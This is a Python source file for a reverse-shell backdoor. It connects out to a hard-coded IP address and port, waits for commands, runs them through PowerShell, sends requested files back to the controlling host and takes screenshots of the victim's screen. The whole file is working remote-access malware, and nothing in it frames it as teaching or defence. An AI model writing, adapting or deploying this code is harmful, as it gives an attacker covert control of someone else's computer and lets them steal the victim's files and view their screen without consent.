import socket
import os
import subprocess
import pyautogui 
import time 

CHUNK_SIZE = 1024
identifier = "<END OF FILE>"
arp_addresss = ("192.168.18.148",9000)
# binding to serer ip
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(arp_addresss)
while True:
    command = s.recv(CHUNK_SIZE)
    command = command.decode()
    #for stopping command
    print(command)
    if command == "STOP":
        s.close()
        break
    # for blank command
    elif command == "":
        continue
    #for changing directory
    elif command.startswith("cd"):
        print("1")
        pathtomove = command.strip("cd ")
        print(pathtomove)
        if os.path.exists(pathtomove):
            print("2")
            os.chdir(pathtomove)
            print("3")
            message = os.getcwd()
            print(message)
        else:
            print("not exist")
            message = "path doesnot exit"



    elif command.startswith("download"):
        filename = command.strip("download ")
        if os.path.exists(filename):
            status = "Yess"
            s.send(status.encode())
        else:
            status = "Nope"
            s.send(status.encode())
            continue

          
        if status == "Yess":
            with open (filename,"rb") as f :
                data = f.read(CHUNK_SIZE)
                sender = b""
                while len(data)!= 0:
                    sender += data
                    data =f.read(CHUNK_SIZE)

                print(type(data))
                sender += identifier.encode()
                s.send(sender)
                continue

    elif command == "capture":
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        message = "screenshot capturedd"

    #for running a command on pwershell
    else:
       raw_message =  subprocess.run(["powershell.exe",command],shell = True,capture_output=True)
       if raw_message.stderr == "".encode():
          message = raw_message.stdout.decode()
       else:
           message = "error"

    #for encoding and sending messages
    message = message + identifier
    s.sendall(message.encode())
